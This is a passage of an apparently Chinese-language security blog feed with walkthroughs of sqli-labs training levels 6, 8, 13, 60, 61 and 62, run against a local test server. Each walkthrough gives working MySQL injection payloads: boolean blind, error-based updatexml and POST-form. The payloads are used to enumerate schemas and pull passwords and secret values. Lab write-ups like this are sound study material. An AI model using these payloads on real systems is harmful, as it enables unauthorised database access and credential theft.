<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为页面不返回内容，只有you are in和不显示这两个，所以不能使用union注入，这里需要使用布尔盲注，所以先要查看当前数据库长度，因为加上双引号了所以后面要跟注释符，</span><br><span class="line">使用布尔注入的时候不用能使union和group_concat只能用select，</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们查看一下数据库长度</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and length(database())&#x3D;8--+</span><br><span class="line">输入8返回you are in 表示正确，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584340647346.png" alt="1584340647346"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在尝试一下9，页面没有回显，表示错误，可以确定当前数据库长度为8，然后查看当前数据库名称</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584340683070.png" alt="1584340683070"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前数据库名称</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr(database(),1,1))&#x3D;115--+</span><br><span class="line">我们这里使用ascii码来查询，发现115返回you are in 其他不回显，说明115正确，115对应的ascii是s</span><br><span class="line">依次测试，最后得出结果是security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584341322098.png" alt="1584341322098"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当知道当前数据库是security之后，测试当前库下表</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&#x3D;101--+</span><br><span class="line">当前测试ascii码为101对应的是e，然后向后测试得出第一个表为emails，</span><br><span class="line">更改limit查询其他表referers、uagents、users</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584342179061.png" alt="1584342179061"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">users表是我们想要的，我们查看users表中的字段</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&#x3D;105--+</span><br><span class="line">返回正确，105ascii对应的是i，经过测试第一个字段为id，第二个为password，第三个为username</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584347589338.png" alt="1584347589338"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们来查看一下password里的第一个数据，后面的数据以此类推</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-6&#x2F;?id&#x3D;1&quot; and ascii(substr((select password from users limit 0,1),1,1))&#x3D;68--+</span><br><span class="line">68对应的ascii是大写D我们查看一下数据库是不是，发现确实是大写D开头说明正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584348249846.png" alt="1584348249846"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第六十一关报错次数限制</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/</url>
    <content><![CDATA[<p>查看初始页面</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585272756354.png" alt="1585272756354"></p>
<p>显示输入id，输入id之后查看页面，页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585272779489.png" alt="1585272779489"></p>
<p>使用单引号查看闭合信息，发现单引号后面还有两个括号</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585272810039.png" alt="1585272810039"></p>
<p>加上括号和注释符，查看页面返回信息，返回信息成功</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585272844221.png" alt="1585272844221"></p>
<p>查看字段数字段数等于4的时候页面返回错误</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585272872093.png" alt="1585272872093"></p>
<p>查看字段3，页面返回正确，</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585272897593.png" alt="1585272897593"></p>
<p>使用union查看注入点，返现union不能返回注入点了，所以不能使用union</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585272977778.png" alt="1585272977778"></p>
<p>使用报错注入，查看当前数据库，页面返回challenges</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-61&#x2F;?id&#x3D;-1&#39;)) and updatexml(1,concat(0x7e,(database())),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585273039859.png" alt="1585273039859"></p>
<p>查看challenges库中的表，页面返回tq0w5yzn5n表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-61&#x2F;?id&#x3D;-1&#39;)) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;challenges&#39;)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585273112393.png" alt="1585273112393"></p>
<p>查看tq0w5yzn5n表中的字段，页面返回id,sessid,secret_UEMR,tryy四个字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-61&#x2F;?id&#x3D;-1&#39;)) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;challenges&#39; and table_name&#x3D;&#39;tq0w5yzn5n&#39;)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585273192919.png" alt="1585273192919"></p>
<p>查看secret_UEMR字段下的数据，返回2kpfwBoYzHpnIGhLSrnfYIvk数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-61&#x2F;?id&#x3D;-1&#39;)) and updatexml(1,concat(0x7e,(select group_concat(secret_UEMR)from tq0w5yzn5n)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585273249338.png" alt="1585273249338"></p>
<p>将该数据提交，页面返回 恭喜你成功了</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585273273793.png" alt="1585273273793"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第八关GET盲注</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">确定当前字符长度。</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8--+</span><br><span class="line">我们发现字符长度为8的时候返回you are in 表示长度为8</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584324918160.png" alt="1584324918160"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看当前库名，使用sacii码，发现115返回you are in 其他编码不显示，115ascii编码对应的是s经过向后测试，测出库名为security。</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr(database(),1,1))&#x3D;115--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584324757710.png" alt="1584324757710"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们再来查看当前表名</span><br><span class="line">我们查询了第一个表发现ascii是101，101对应的ascii是e相同步骤更改,1,1的第一个数据向后测试，测试出的结果第一个表名是emali，测试第二个表名时更改limit 0,1的第一个数字0，以此类推</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584325563927.png" alt="1584325563927"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们测试出了表名，发现有emails、referers、uagents、users，其中users就是我们想要的</span><br><span class="line">我们来查看users里面有什么字段</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select  column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&#x3D;105--+</span><br><span class="line">我们看到ascii码为105是返回正常，105对应的ascii是i然后经过测试这个字段是id，其他字段是password，username</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584325878093.png" alt="1584325878093"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们来查看表数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+</span><br><span class="line">我们查看了当前id的第一个字母对应的ascii是49，49对应的字母是1，以此类推，可以查看出其他的字段数据</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AB%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584326020353.png" alt="1584326020353"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第六十二关时间次数限制</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/</url>
    <content><![CDATA[<p>查看原始页面，给了数据库CHALLENGES</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585274101427.png" alt="1585274101427"></p>
<p>查看源码，被单引号和括号</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585274163424.png" alt="1585274163424"></p>
<p>页面中加入单引号括号和注释符，页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%BA%8C%E5%85%B3%E6%97%B6%E9%97%B4%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585274218959.png" alt="1585274218959"></p>
<p>查看表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-62&#x2F;?id&#x3D;1&#39;) and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;CHALLENGES&#39; limit 0,1),1,1))&#x3D;105 --+</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第六十关报错次数限制</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/</url>
    <content><![CDATA[<p>查看网页</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242589957.png" alt="1585242589957"></p>
<p>查看源码，红线处将id进行了双引号和括号的包裹</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242633009.png" alt="1585242633009"></p>
<p>页面中使用双引号引号和括号，注释符，页面返回正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242869064.png" alt="1585242869064"></p>
<p>使用union查看注入点，页面并没有回显说明不能使用union注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242906072.png" alt="1585242906072"></p>
<p>使用报错注入来查看当前数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-60&#x2F;?id&#x3D;-1&quot;) and updatexml(1,concat(0x7e,(database())),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585242973609.png" alt="1585242973609"></p>
<p>查看表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-60&#x2F;?id&#x3D;-1&quot;) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;challenges&#39;)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585243057640.png" alt="1585243057640"></p>
<p>查看字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-60&#x2F;?id&#x3D;-1&quot;) and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;&#39;challenges&#39; and table_name&#x3D;&#39;jg6ofd34t5&#39;)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585243101581.png" alt="1585243101581"></p>
<p>查看secret_01ME数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-60&#x2F;?id&#x3D;-1&quot;) and updatexml(1,concat(0x7e,(select group_concat(secret_01ME)from jg6ofd34t5)),1) --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585243150619.png" alt="1585243150619"></p>
<p>提交数据，恭喜你成功了</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%B3%E6%8A%A5%E9%94%99%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585243166531.png" alt="1585243166531"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第十三关POST报错</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3POST%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试报错信息</span><br><span class="line">1&#39;</span><br><span class="line">出现报错信息，后面还有有一个括号</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584432327527.png" alt="1584432327527"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加上括号再加上注释符尝试一下</span><br><span class="line">1&#39;)#</span><br><span class="line">页面回显正常，说明可以进行注入</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584432380167.png" alt="1584432380167"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取字段数</span><br><span class="line">1&#39;) order by 2 #</span><br><span class="line">之前测试过了，这里的字段是是2，页面回显正常说明正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584432448506.png" alt="1584432448506"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试注入点</span><br><span class="line">1&#39;) union select 1,2#</span><br><span class="line">发现没有回显，这里我们想到之前提示过错误信息，但现在没有回显，可以使用报错注入尝试一下</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584433334528.png" alt="1584433334528"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用报错注入查看当前数据库</span><br><span class="line">1&#39;) and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br><span class="line">成功地返回了当前数据库是security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584433309568.png" alt="1584433309568"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">知道数据库之后查看security的表</span><br><span class="line">1&#39;) and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),0x7e),1)#</span><br><span class="line">这里使用了limit因为报错注入只能显示一行，如果不适用limit会报错，这里我们查看了第四个表名，limit 3,1因为limit是从0开始数的所以第四个表名要用3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584433581316.png" alt="1584433581316"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看users表的字段</span><br><span class="line">1&#39;) and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 2,1),0x7e),1)#</span><br><span class="line">这里需要将库和表名都加上，不然会到其他的库找users内的字段，而不是在当前库</span><br><span class="line">我们这里将limit改成2查看第三个字段，第三个字段返回password，查看一下</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584433780319.png" alt="1584433780319"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看一下password字段</span><br><span class="line">1&#39;) and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)#</span><br><span class="line">成功地返回信息，如果要继续查看更改limit的值就可以</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E4%B8%89%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584433885530.png" alt="1584433885530"></p>
]]></content>
  </entry>
  <entry>
